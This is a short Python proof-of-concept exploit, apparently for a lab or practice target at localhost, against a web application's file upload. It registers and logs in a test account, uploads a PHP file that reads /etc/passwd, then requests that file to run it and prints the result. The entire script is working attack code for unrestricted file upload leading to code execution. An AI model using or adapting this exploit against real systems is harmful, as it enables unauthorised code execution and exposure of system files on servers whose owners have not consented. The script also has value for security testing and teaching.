#!/usr/bin/python3

import requests
import time

target_url = "http://localhost:8015/music-copyright/cgi-bin/"

registration_payload = {
			"first": "test",
			"last": "test",
			"email": "testemail@email.com",
			"password": "password"
	      		}

login_payload = {
		"email": "testemail@email.com",
		"password": "password"
		}

exploit_payload = {
			'file':('exploit.php', '<?php\n echo file_get_contents("/etc/passwd");\n?>')
		  }

# register account 
r = requests.post(target_url+"account.php", registration_payload)

# attempt login
r = requests.post(target_url+"login.php", login_payload)
time.sleep(1)

login_cookies = r.cookies

# attempt exploit upload
r = requests.post(target_url+"upload.php", files=exploit_payload, cookies=login_cookies)

# trigger exploit
r = requests.get(target_url+"uploads/exploit.php")

# print result
print(r.text)
